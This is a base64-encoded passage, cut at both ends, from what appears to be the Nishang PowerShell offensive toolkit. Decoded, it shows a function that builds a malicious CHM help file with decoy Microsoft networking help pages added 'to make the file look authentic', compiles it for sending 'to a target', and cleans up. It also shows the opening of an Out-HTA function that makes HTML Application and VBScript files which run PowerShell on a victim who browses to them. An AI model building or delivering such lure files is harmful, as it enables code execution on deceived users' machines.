25hbCBkZWZhdWx0IGdhdGV3YXlzIHRoYXQgY2FuIGJlIHVzZWQgYnkgdGhpcyBuZXR3b3JrIGNvbm5lY3Rpb24uIEEgZGVmYXVsdCBnYXRld2F5IGlzIGEgbG9jYWwgSVAgcm91dGVyIHRoYXQgaXMgdXNlZCB0byBmb3J3YXJkIHBhY2tldHMgdG8gZGVzdGluYXRpb25zIGJleW9uZCB0aGUgbG9jYWwgbmV0d29yay4gPC9wPgoKPHA+PGI+QXV0b21hdGljIG1ldHJpYzwvYj4gc3BlY2lmaWVzIHdoZXRoZXIgVENQL0lQIGF1dG9tYXRpY2FsbHkgY2FsY3VsYXRlcyBhIHZhbHVlIGZvciBhbiBpbnRlcmZhY2UgbWV0cmljIHRoYXQgaXMgYmFzZWQgb24gdGhlIHNwZWVkIG9mIHRoZSBpbnRlcmZhY2UuIFRoZSBoaWdoZXN0LXNwZWVkIGludGVyZmFjZSBoYXMgdGhlIGxvd2VzdCBpbnRlcmZhY2UgbWV0cmljIHZhbHVlLiA8L3A+Cgo8cD48Yj5JbnRlcmZhY2UgbWV0cmljPC9iPiBwcm92aWRlcyBhIGxvY2F0aW9uIGZvciB5b3UgdG8gdHlwZSBhIHZhbHVlIGZvciB0aGUgaW50ZXJmYWNlIG1ldHJpYyBmb3IgdGhpcyBuZXR3b3JrIGNvbm5lY3Rpb24uIEEgbG93ZXIgdmFsdWUgZm9yIHRoZSBpbnRlcmZhY2UgbWV0cmljIGluZGljYXRlcyBhIGhpZ2hlciBwcmlvcml0eSBmb3IgdXNlIG9mIHRoaXMgaW50ZXJmYWNlLiA8L3A+CjxoMSBjbGFzcz0iaGVhZGluZyI+UHJvY2VkdXJlczwvaDE+PGRpdiBpZD0ic2VjdGlvblNlY3Rpb24wIiBjbGFzcz0ic2VjdGlvbiI+PGNvbnRlbnQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij4KPHRhYmxlIGNsYXNzPSJhbGVydFRhYmxlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiIHhtbG5zPSIiPjx0cj48dGQgY2xhc3M9ImltZ0NlbGwiPjxpbWcgY2xhc3M9Im5vdGUiIHNyYz0iLi4vbG9jYWwvUHJvY2VkdXJlLmdpZiI+PC9pbWc+PC90ZD48dGQgY2xhc3M9InByb2NIZWFkaW5nQ2VsbCI+PGI+VG8gY29uZmlndXJlIGFkZGl0aW9uYWwgSVAgYWRkcmVzc2VzIGZvciB0aGlzIGNvbm5lY3Rpb248L2I+PC90ZD48L3RyPjwvdGFibGU+PGRkdWU6c3RlcHM+PG9sIGNsYXNzPSJvcmRlcmVkIiB4bWxucz0iIj48bGk+PGNvbnRlbnQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij4KPHAgeG1sbnM9IiI+SW4gPGI+SVAgQWRkcmVzc2VzPC9iPiwgY2xpY2sgPGI+QWRkPC9iPi48Yj4gPC9iPjwvcD4KPC9jb250ZW50PjwvbGk+PGxpPjxjb250ZW50IHhtbG5zPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSI+CjxwIHhtbG5zPSIiPlR5cGUgYW4gSVAgYWRkcmVzcyBpbiA8Yj5JUCBhZGRyZXNzPC9iPi4gPC9wPgo8L2NvbnRlbnQ+PC9saT48bGk+PGNvbnRlbnQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij4KPHAgeG1sbnM9IiI+VHlwZSBhIHN1Ym5ldCBtYXNrIGluIDxiPlN1Ym5ldCBtYXNrPC9iPiwgYW5kIHRoZW4gY2xpY2sgPGI+QWRkPC9iPi48L3A+CjwvY29udGVudD48L2xpPjxsaT48Y29udGVudCB4bWxucz0iaHR0cDovL2RkdWUuc2NoZW1hcy5taWNyb3NvZnQuY29tL2F1dGhvcmluZy8yMDAzLzUiPgo8cCB4bWxucz0iIj5SZXBlYXQgc3RlcHPDgsKgMSB0aHJvdWdoIDMgZm9yIGVhY2ggSVAgYWRkcmVzcyB5b3Ugd2FudCB0byBhZGQsIGFuZCB0aGVuIGNsaWNrIDxiPk9LPC9iPi48L3A+CjwvY29udGVudD48L2xpPjwvb2w+PC9kZHVlOnN0ZXBzPgoKPHRhYmxlIGNsYXNzPSJhbGVydFRhYmxlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiIHhtbG5zPSIiPjx0cj48dGQgY2xhc3M9ImltZ0NlbGwiPjxpbWcgY2xhc3M9Im5vdGUiIHNyYz0iLi4vbG9jYWwvUHJvY2VkdXJlLmdpZiI+PC9pbWc+PC90ZD48dGQgY2xhc3M9InByb2NIZWFkaW5nQ2VsbCI+PGI+VG8gY29uZmlndXJlIGFkZGl0aW9uYWwgZGVmYXVsdCBnYXRld2F5cyBmb3IgdGhpcyBjb25uZWN0aW9uPC9iPjwvdGQ+PC90cj48L3RhYmxlPjxkZHVlOnN0ZXBzPjxvbCBjbGFzcz0ib3JkZXJlZCIgeG1sbnM9IiI+PGxpPjxjb250ZW50IHhtbG5zPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSI+CjxwIHhtbG5zPSIiPk9uIHRoZSA8Yj5JUCBTZXR0aW5nczwvYj4gdGFiLCBpbiA8Yj5EZWZhdWx0IGdhdGV3YXlzPC9iPiwgY2xpY2sgPGI+QWRkPC9iPi48L3A+CjwvY29udGVudD48L2xpPjxsaT48Y29udGVudCB4bWxucz0iaHR0cDovL2RkdWUuc2NoZW1hcy5taWNyb3NvZnQuY29tL2F1dGhvcmluZy8yMDAzLzUiPgo8cCB4bWxucz0iIj5JbiA8Yj5UQ1AvSVAgR2F0ZXdheSBBZGRyZXNzPC9iPiwgdHlwZSB0aGUgSVAgYWRkcmVzcyBvZiB0aGUgZGVmYXVsdCBnYXRld2F5IGluIDxiPkdhdGV3YXk8L2I+LiBUbyBtYW51YWxseSBjb25maWd1cmUgYSBkZWZhdWx0IHJvdXRlIG1ldHJpYywgY2xlYXIgdGhlIDxiPkF1dG9tYXRpYyBtZXRyaWMgPC9iPmNoZWNrIGJveCBhbmQgdHlwZSBhIG1ldHJpYyBpbiA8Yj5NZXRyaWM8L2I+LjwvcD4KPC9jb250ZW50PjwvbGk+PGxpPjxjb250ZW50IHhtbG5zPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSI+CjxwIHhtbG5zPSIiPkNsaWNrIDxiPkFkZDwvYj4uPC9wPgo8L2NvbnRlbnQ+PC9saT48bGk+PGNvbnRlbnQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij4KPHAgeG1sbnM9IiI+UmVwZWF0IHN0ZXBzw4LCoDEgdGhyb3VnaCAzIGZvciBlYWNoIGRlZmF1bHQgZ2F0ZXdheSB5b3Ugd2FudCB0byBhZGQsIGFuZCB0aGVuIGNsaWNrIDxiPk9LPC9iPi48L3A+CjwvY29udGVudD48L2xpPjwvb2w+PC9kZHVlOnN0ZXBzPgoKPHRhYmxlIGNsYXNzPSJhbGVydFRhYmxlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiIHhtbG5zPSIiPjx0cj48dGQgY2xhc3M9ImltZ0NlbGwiPjxpbWcgY2xhc3M9Im5vdGUiIHNyYz0iLi4vbG9jYWwvUHJvY2VkdXJlLmdpZiI+PC9pbWc+PC90ZD48dGQgY2xhc3M9InByb2NIZWFkaW5nQ2VsbCI+PGI+VG8gY29uZmlndXJlIGEgY3VzdG9tIG1ldHJpYyBmb3IgdGhpcyBjb25uZWN0aW9uPC9iPjwvdGQ+PC90cj48L3RhYmxlPjxkZHVlOnN0ZXBzPjx1bCB4bWxucz0iIj48bGk+PGNvbnRlbnQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij4KPHAgeG1sbnM9IiI+Q2xlYXIgdGhlIDxiPkF1dG9tYXRpYyBtZXRyaWM8L2I+IGNoZWNrIGJveCwgYW5kIHRoZW4gdHlwZSBhIG1ldHJpYyB2YWx1ZSBpbiA8Yj5JbnRlcmZhY2UgbWV0cmljPC9iPi48L3A+CjwvY29udGVudD48L2xpPjwvdWw+PC9kZHVlOnN0ZXBzPgo8L2NvbnRlbnQ+PC9kaXY+PGgxIGNsYXNzPSJoZWFkaW5nIj5BZGRpdGlvbmFsIHJlZmVyZW5jZXM8L2gxPjxkaXYgaWQ9InNlY3Rpb25TZWN0aW9uMSIgY2xhc3M9InNlY3Rpb24iPjxjb250ZW50IHhtbG5zPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSI+CjxwIHhtbG5zPSIiPkZvciB1cGRhdGVkIGRldGFpbGVkIElUIHBybyBpbmZvcm1hdGlvbiBhYm91dCBUQ1AvSVAgdmVyc2lvbnMgNCBhbmQgNiwgc2VlIDxhIGhyZWY9Imh0dHA6Ly9nby5taWNyb3NvZnQuY29tL2Z3bGluay8/TGlua0lEPTExNzQzNyIgYWx0PSIiIHRhcmdldD0iX2JsYW5rIj48bGlua1RleHQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij5odHRwOi8vZ28ubWljcm9zb2Z0LmNvbS9md2xpbmsvP0xpbmtJRD0xMTc0Mzc8L2xpbmtUZXh0PjwvYT4gYW5kIDxhIGhyZWY9Imh0dHA6Ly9nby5taWNyb3NvZnQuY29tL2Z3bGluay8/TGlua0lEPTcxNTQzIiBhbHQ9IiIgdGFyZ2V0PSJfYmxhbmsiPjxsaW5rVGV4dCB4bWxucz0iaHR0cDovL2RkdWUuc2NoZW1hcy5taWNyb3NvZnQuY29tL2F1dGhvcmluZy8yMDAzLzUiPmh0dHA6Ly9nby5taWNyb3NvZnQuY29tL2Z3bGluay8/TGlua0lEPTcxNTQzPC9saW5rVGV4dD48L2E+LjwvcD4KPC9jb250ZW50PjwvZGl2PjwvZGl2PjxociAvPjxwIC8+PC9kaXY+PC9ib2R5PjwvaHRtbD4KPC9CT0RZPgo8L0hUTUw+CiJACiAgICAjU2Vjb25kIGhlbHAgdG9waWMgdG8gbWFrZSB0aGUgZmlsZSBsb29rIGF1dGhlbnRpYy4KICAgICRDSE1IVE1MMiA9IEAiCjxodG1sIERJUj0iTFRSIiB4bWxuczpNU0hlbHA9Imh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vbXNoZWxwIiB4bWxuczpkZHVlPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOnRvb2w9Imh0dHA6Ly93d3cubWljcm9zb2Z0LmNvbS90b29sdGlwIj48aGVhZD48TUVUQSBIVFRQLUVRVUlWPSJDb250ZW50LVR5cGUiIENPTlRFTlQ9InRleHQvaHRtbDsgQ0hBUlNFVD1XaW5kb3dzLTEyNTIiPjwvTUVUQT48TUVUQSBOQU1FPSJzYXZlIiBDT05URU5UPSJoaXN0b3J5Ij48L01FVEE+PHRpdGxlPklQdjQgQWR2YW5jZWQgV0lOUyBUYWI8L3RpdGxlPjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii4uL2xvY2FsL0NsYXNzaWMuY3NzIj48L2xpbms+PHNjcmlwdCBzcmM9Ii4uL2xvY2FsL3NjcmlwdC5qcyI+PC9zY3JpcHQ+PC9oZWFkPjxib2R5PjxkaXYgaWQ9ImhlYWRlciI+PGgxPklQdjQgQWR2YW5jZWQgV0lOUyBUYWI8L2gxPjwvZGl2PjxkaXYgaWQ9Im1haW5TZWN0aW9uIj48ZGl2IGlkPSJtYWluQm9keSI+PHAgY2xhc3M9InJ1bm5pbmdIZWFkZXIiPjwvcD4KPHA+WW91IGNhbiB1c2UgdGhlIHNldHRpbmdzIG9uIHRoaXMgdGFiIGZvciB0aGlzIG5ldHdvcmsgY29ubmVjdGlvbiBvbmx5IGlmIHlvdSBhcmUgbm90IHVzaW5nIHRoZSA8Yj5PYnRhaW4gYW4gSVAgYWRkcmVzcyBhdXRvbWF0aWNhbGx5PC9iPiBvbiB0aGUgPGI+R2VuZXJhbDwvYj4gdGFiLjwvcD4KCjxwPjxiPldJTlMgYWRkcmVzc2VzLCBpbiBvcmRlciBvZiB1c2U8L2I+IGxpc3RzIHRoZSBXaW5kb3dzIEludGVybmV0IE5hbWUgU2VydmljZSAoV0lOUykgc2VydmVycyB0aGF0IFRDUC9JUCBxdWVyaWVzIHRvIHJlc29sdmUgbmV0d29yayBiYXNpYyBpbnB1dC9vdXRwdXQgc3lzdGVtIChOZXRCSU9TKSBuYW1lcy4gV0lOUyBzZXJ2ZXJzIGFyZSBxdWVyaWVkIGluIHRoZSBvcmRlciBpbiB3aGljaCB0aGV5IGFyZSBsaXN0ZWQgaGVyZS48L3A+Cgo8cD48Yj5FbmFibGUgTE1IT1NUUyBsb29rdXA8L2I+IHNwZWNpZmllcyB3aGV0aGVyIGFuIExtaG9zdHMgZmlsZSBpcyB1c2VkIHRvIHJlc29sdmUgdGhlIE5ldEJJT1MgbmFtZXMgb2YgcmVtb3RlIGNvbXB1dGVycyB0byBhbiBJUCBhZGRyZXNzLiA8L3A+Cgo8cD5DbGljayA8Yj5JbXBvcnQgTE1IT1NUUzwvYj4gdG8gaW1wb3J0IGEgZmlsZSBpbnRvIHRoZSBMbWhvc3RzIGZpbGUuIFRoZSBMbWhvc3RzIGZpbGUgaXMgbG9jYXRlZCBpbiB0aGUgJVN5c3RlbVJvb3QlXFN5c3RlbTMyXERyaXZlcnNcRXRjIGZvbGRlciBvbiBhIFdpbmRvd3MtYmFzZWQgY29tcHV0ZXIuIFRoZXJlIGlzIGFsc28gYSBzYW1wbGUgTG1ob3N0cyBmaWxlIChMbWhvc3RzLnNhbSkgaW4gdGhpcyBmb2xkZXIuIFdoZW4geW91IGltcG9ydCBMTUhPU1RTIGZyb20gYSBmaWxlLCB0aGUgb3JpZ2luYWwgTG1ob3N0cyBmaWxlIGlzIG5vdCBhcHBlbmRlZCB0bywgYnV0IGlzIG92ZXJ3cml0dGVuIGJ5IHRoZSBuZXcgZmlsZS48L3A+Cgo8cD48Yj5OZXRCSU9TIHNldHRpbmc8L2I+IHNwZWNpZmllcyB3aGV0aGVyIHRoaXMgbmV0d29yayBjb25uZWN0aW9uIG9idGFpbnMgdGhlIHNldHRpbmcgdG8gZW5hYmxlIG9yIGRpc2FibGUgTmV0QklPUyBvdmVyIFRDUC9JUCAoTmV0QlQpIGZyb20gYSBEeW5hbWljIEhvc3QgQ29uZmlndXJhdGlvbiBQcm90b2NvbCAoREhDUCkgc2VydmVyLiA8L3A+Cgo8cD5XaGVuIGFuIElQIGFkZHJlc3MgaXMgYXV0b21hdGljYWxseSBvYnRhaW5lZCwgdGhlIDxiPkRlZmF1bHQ8L2I+IG9wdGlvbiBpcyBzZWxlY3RlZCBzbyB0aGF0IHRoaXMgY29tcHV0ZXIgdXNlcyB0aGUgTmV0QlQgc2V0dGluZyBhcyBvcHRpb25hbGx5IHByb3ZpZGVkIGJ5IHRoZSBESENQIHNlcnZlciB3aGVuIHRoaXMgY29tcHV0ZXIgb2J0YWlucyBhbiBJUCBhZGRyZXNzIGFuZCBjb25maWd1cmF0aW9uIGxlYXNlLiBJZiB0aGUgRGlzYWJsZSBOZXRCSU9TIG92ZXIgVENQL0lQIChOZXRCVCkgREhDUCBvcHRpb24gaXMgcHJvdmlkZWQgYnkgdGhlIERIQ1Agc2VydmVyLCB0aGUgdmFsdWUgb2YgdGhlIG9wdGlvbiBkZXRlcm1pbmVzIHdoZXRoZXIgTmV0QlQgaXMgZW5hYmxlZCBvciBkaXNhYmxlZC4gSWYgdGhlIERpc2FibGUgTmV0QklPUyBvdmVyIFRDUC9JUCAoTmV0QlQpIERIQ1Agb3B0aW9uIGlzIG5vdCBwcm92aWRlZCBieSB0aGUgREhDUCBzZXJ2ZXIsIE5ldEJUIGlzIGVuYWJsZWQuPC9wPgoKPHA+SWYgeW91IGFyZSBtYW51YWxseSBjb25maWd1cmluZyBhbiBJUCBhZGRyZXNzLCBzZWxlY3RpbmcgPGI+RW5hYmxlIE5ldEJJT1Mgb3ZlciBUQ1AvSVA8L2I+IGVuYWJsZXMgTmV0QlQuIFRoaXMgb3B0aW9uIGlzIG5vdCBhdmFpbGFibGUgZm9yIGRpYWwtdXAgY29ubmVjdGlvbnMuPC9wPgo8aDEgY2xhc3M9ImhlYWRpbmciPlByb2NlZHVyZXM8L2gxPjxkaXYgaWQ9InNlY3Rpb25TZWN0aW9uMCIgY2xhc3M9InNlY3Rpb24iPjxjb250ZW50IHhtbG5zPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSI+Cjx0YWJsZSBjbGFzcz0iYWxlcnRUYWJsZSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIwIiB4bWxucz0iIj48dHI+PHRkIGNsYXNzPSJpbWdDZWxsIj48aW1nIGNsYXNzPSJub3RlIiBzcmM9Ii4uL2xvY2FsL1Byb2NlZHVyZS5naWYiPjwvaW1nPjwvdGQ+PHRkIGNsYXNzPSJwcm9jSGVhZGluZ0NlbGwiPjxiPlRvIGNvbmZpZ3VyZSBhZHZhbmNlZCBXSU5TIHByb3BlcnRpZXM8L2I+PC90ZD48L3RyPjwvdGFibGU+PGRkdWU6c3RlcHM+PG9sIGNsYXNzPSJvcmRlcmVkIiB4bWxucz0iIj48bGk+PGNvbnRlbnQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij4KPHAgeG1sbnM9IiI+SW4gPGI+V0lOUyBhZGRyZXNzZXMsIGluIG9yZGVyIG9mIHVzZTwvYj4sIGNsaWNrIDxiPkFkZDwvYj4sIHR5cGUgdGhlIGFkZHJlc3Mgb2YgdGhlIFdJTlMgc2VydmVyLCBhbmQgdGhlbiBjbGljayA8Yj5BZGQ8L2I+LjwvcD4KPC9jb250ZW50PjwvbGk+PGxpPjxjb250ZW50IHhtbG5zPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSI+CjxwIHhtbG5zPSIiPlJlcGVhdCBzdGVwIDEgZm9yIGVhY2ggV0lOUyBzZXJ2ZXIgSVAgYWRkcmVzcyB5b3Ugd2FudCB0byBhZGQsIGFuZCB0aGVuIGNsaWNrIDxiPk9LPC9iPi48L3A+CjwvY29udGVudD48L2xpPjwvb2w+PC9kZHVlOnN0ZXBzPgoKPHRhYmxlIGNsYXNzPSJhbGVydFRhYmxlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiIHhtbG5zPSIiPjx0cj48dGQgY2xhc3M9ImltZ0NlbGwiPjxpbWcgY2xhc3M9Im5vdGUiIHNyYz0iLi4vbG9jYWwvUHJvY2VkdXJlLmdpZiI+PC9pbWc+PC90ZD48dGQgY2xhc3M9InByb2NIZWFkaW5nQ2VsbCI+PGI+VG8gZW5hYmxlIHRoZSB1c2Ugb2YgdGhlIExtaG9zdHMgZmlsZSB0byByZXNvbHZlIHJlbW90ZSBOZXRCSU9TIG5hbWVzPC9iPjwvdGQ+PC90cj48L3RhYmxlPjxkZHVlOnN0ZXBzPjx1bCB4bWxucz0iIj48bGk+PGNvbnRlbnQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij4KPHAgeG1sbnM9IiI+U2VsZWN0IHRoZSA8Yj5FbmFibGUgTE1IT1NUUyBsb29rdXA8L2I+IGNoZWNrIGJveC4gVGhpcyBvcHRpb24gaXMgZW5hYmxlZCBieSBkZWZhdWx0LjwvcD4KPC9jb250ZW50PjwvbGk+PC91bD48L2RkdWU6c3RlcHM+Cgo8dGFibGUgY2xhc3M9ImFsZXJ0VGFibGUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMCIgeG1sbnM9IiI+PHRyPjx0ZCBjbGFzcz0iaW1nQ2VsbCI+PGltZyBjbGFzcz0ibm90ZSIgc3JjPSIuLi9sb2NhbC9Qcm9jZWR1cmUuZ2lmIj48L2ltZz48L3RkPjx0ZCBjbGFzcz0icHJvY0hlYWRpbmdDZWxsIj48Yj5UbyBzcGVjaWZ5IHRoZSBsb2NhdGlvbiBvZiB0aGUgZmlsZSB0aGF0IHlvdSB3YW50IHRvIGltcG9ydCBpbnRvIHRoZSBMbWhvc3RzIGZpbGU8L2I+PC90ZD48L3RyPjwvdGFibGU+PGRkdWU6c3RlcHM+PHVsIHhtbG5zPSIiPjxsaT48Y29udGVudCB4bWxucz0iaHR0cDovL2RkdWUuc2NoZW1hcy5taWNyb3NvZnQuY29tL2F1dGhvcmluZy8yMDAzLzUiPgo8cCB4bWxucz0iIj5DbGljayA8Yj5JbXBvcnQgTE1IT1NUUzwvYj4sIGFuZCB0aGVuIHNlbGVjdCB0aGUgZmlsZSBpbiB0aGUgPGI+T3BlbjwvYj4gZGlhbG9nIGJveC48L3A+CjwvY29udGVudD48L2xpPjwvdWw+PC9kZHVlOnN0ZXBzPgoKPHRhYmxlIGNsYXNzPSJhbGVydFRhYmxlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiIHhtbG5zPSIiPjx0cj48dGQgY2xhc3M9ImltZ0NlbGwiPjxpbWcgY2xhc3M9Im5vdGUiIHNyYz0iLi4vbG9jYWwvUHJvY2VkdXJlLmdpZiI+PC9pbWc+PC90ZD48dGQgY2xhc3M9InByb2NIZWFkaW5nQ2VsbCI+PGI+VG8gZW5hYmxlIG9yIGRpc2FibGUgTmV0QklPUyBvdmVyIFRDUC9JUDwvYj48L3RkPjwvdHI+PC90YWJsZT48ZGR1ZTpzdGVwcz48dWwgeG1sbnM9IiI+PGxpPjxjb250ZW50IHhtbG5zPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSI+CjxwIHhtbG5zPSIiPlRvIGVuYWJsZSB0aGUgdXNlIG9mIE5ldEJJT1Mgb3ZlciBUQ1AvSVAsIGNsaWNrIDxiPkVuYWJsZSBOZXRCSU9TIG92ZXIgVENQL0lQPC9iPi48L3A+CjwvY29udGVudD48L2xpPjxsaT48Y29udGVudCB4bWxucz0iaHR0cDovL2RkdWUuc2NoZW1hcy5taWNyb3NvZnQuY29tL2F1dGhvcmluZy8yMDAzLzUiPgo8cCB4bWxucz0iIj5UbyBkaXNhYmxlIHRoZSB1c2Ugb2YgTmV0QklPUyBvdmVyIFRDUC9JUCwgY2xpY2sgPGI+RGlzYWJsZSBOZXRCSU9TIG92ZXIgVENQL0lQPC9iPi48L3A+CjwvY29udGVudD48L2xpPjxsaT48Y29udGVudCB4bWxucz0iaHR0cDovL2RkdWUuc2NoZW1hcy5taWNyb3NvZnQuY29tL2F1dGhvcmluZy8yMDAzLzUiPgo8cCB4bWxucz0iIj5UbyBoYXZlIHRoZSBESENQIHNlcnZlciBkZXRlcm1pbmUgd2hldGhlciBOZXRCSU9TIG92ZXIgVENQL0lQIGlzIGVuYWJsZWQgb3IgZGlzYWJsZWQsIGNsaWNrIDxiPkRlZmF1bHQ8L2I+LjwvcD4KPC9jb250ZW50PjwvbGk+PC91bD48L2RkdWU6c3RlcHM+CjwvY29udGVudD48L2Rpdj48aDEgY2xhc3M9ImhlYWRpbmciPkFkZGl0aW9uYWwgcmVmZXJlbmNlczwvaDE+PGRpdiBpZD0ic2VjdGlvblNlY3Rpb24xIiBjbGFzcz0ic2VjdGlvbiI+PGNvbnRlbnQgeG1sbnM9Imh0dHA6Ly9kZHVlLnNjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpbmcvMjAwMy81Ij4KPHAgeG1sbnM9IiI+Rm9yIHVwZGF0ZWQgZGV0YWlsZWQgSVQgcHJvIGluZm9ybWF0aW9uIGFib3V0IFRDUC9JUCB2ZXJzaW9ucyA0IGFuZCA2LCBzZWUgPGEgaHJlZj0iaHR0cDovL2dvLm1pY3Jvc29mdC5jb20vZndsaW5rLz9MaW5rSUQ9MTE3NDM3IiBhbHQ9IiIgdGFyZ2V0PSJfYmxhbmsiPjxsaW5rVGV4dCB4bWxucz0iaHR0cDovL2RkdWUuc2NoZW1hcy5taWNyb3NvZnQuY29tL2F1dGhvcmluZy8yMDAzLzUiPmh0dHA6Ly9nby5taWNyb3NvZnQuY29tL2Z3bGluay8/TGlua0lEPTExNzQzNzwvbGlua1RleHQ+PC9hPiBhbmQgPGEgaHJlZj0iaHR0cDovL2dvLm1pY3Jvc29mdC5jb20vZndsaW5rLz9MaW5rSUQ9NzE1NDMiIGFsdD0iIiB0YXJnZXQ9Il9ibGFuayI+PGxpbmtUZXh0IHhtbG5zPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSI+aHR0cDovL2dvLm1pY3Jvc29mdC5jb20vZndsaW5rLz9MaW5rSUQ9NzE1NDM8L2xpbmtUZXh0PjwvYT4uPC9wPgo8L2NvbnRlbnQ+PC9kaXY+PC9kaXY+PGhyIC8+PHAgLz48L2Rpdj48L2JvZHk+PC9odG1sPgoKIkAKCiAgICAjV3JpdGUgYWxsIGZpbGVzIHRvIGRpc2sgZm9yIGNvbXBpbGF0aW9uCiAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJENITVRhYmxlT2ZDb250ZW50cyAtRmlsZVBhdGggIiRPdXRwdXRQYXRoXGRvYy5oaGMiIC1FbmNvZGluZyBkZWZhdWx0CiAgICBPdXQtRmlsZSAtSW5wdXRPYmplY3QgJENITUhUTUwxIC1GaWxlUGF0aCAiJE91dHB1dFBhdGhcZG9jLmh0bSIgLUVuY29kaW5nIGRlZmF1bHQKICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkQ0hNSFRNTDIgLUZpbGVQYXRoICIkT3V0cHV0UGF0aFxkb2MxLmh0bSIgLUVuY29kaW5nIGRlZmF1bHQKICAgIE91dC1GaWxlIC1JbnB1dE9iamVjdCAkQ0hNUHJvamVjdCAtRmlsZVBhdGggIiRPdXRwdXRQYXRoXGRvYy5oaHAiIC1FbmNvZGluZyBkZWZhdWx0CiAgICAKICAgICNDb21waWxlIHRoZSBDSE0sIG9ubHkgdGhpcyBuZWVkcyB0byBiZSBzZW50IHRvIGEgdGFyZ2V0LgogICAgJEhIQyA9ICIkSEhDUGF0aCIgKyAiXGhoYy5leGUiCiAgICAmICIkSEhDIiAiJE91dHB1dFBhdGhcZG9jLmhocCIKCiAgICAjQ2xlYW51cAogICAgUmVtb3ZlLUl0ZW0gIiRPdXRwdXRQYXRoXGRvYy5oaGMiCiAgICBSZW1vdmUtSXRlbSAiJE91dHB1dFBhdGhcZG9jLmh0bSIKICAgIFJlbW92ZS1JdGVtICIkT3V0cHV0UGF0aFxkb2MxLmh0bSIKICAgIFJlbW92ZS1JdGVtICIkT3V0cHV0UGF0aFxkb2MuaGhwIgogICAgCn0KCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI091dC1IVEEjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIE91dC1IVEEKewo8IwouU1lOT1BTSVMKTmlzaGFuZyBzY3JpcHQgd2hpY2ggY291bGQgYmUgdXNlZCBmb3IgZ2VuZXJhdGluZyBIVE1MIEFwcGxpY2F0aW9uIGFuZCBhY2NvbXBhbnlpbmcgVkJzY3JpcHQuIFRoZXNlIGNvdWxkIGJlIGRlcGxveWVkIG9uIAphIHdlYiBzZXJ2ZXIgYW5kIHBvd2Vyc2hlbGwgc2NyaXB0cyBhbmQgY29tbWFuZHMgY291bGQgYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldCBtYWNoaW5lLgoKLkRFU0NSSVBUSU9OClRoZSBzY3JpcHQgZ2VuZXJhdGVzIHR3byBmaWxlcy4gQSBIVEEgZmlsZSBhbmQgYSBWQlNjcmlwdC4gVGhlIEhUQSBhbmQgVkJTY3JpcHQgc2hvdWxkIGJlIGRlcGxveWVkIGluIHNhbWUgZGlyZWN0b3J5IG9mIGEgd2ViIHNlcnZlci4KV2hlbiBhIHRhcmdldCBicm93c2VzIHRvIHRoZSBIVEEgZmlsZSB0aGUgVkJTY3JpcHQgaXMgZXhlY3V0ZWQuIFRoaXMgVkJTY3JpcHQgaXMgdXNlZCB0byBleGVjdXRlIHBvd2Vyc2hlbGwgc2NyaXB0cyBhbmQgY29tbWFuZHMuCgouUEFSQU1FVEVSIFBheWxvYWQKUGF5bG9hZCB3aGljaCB5b3Ugd2FudCBleGV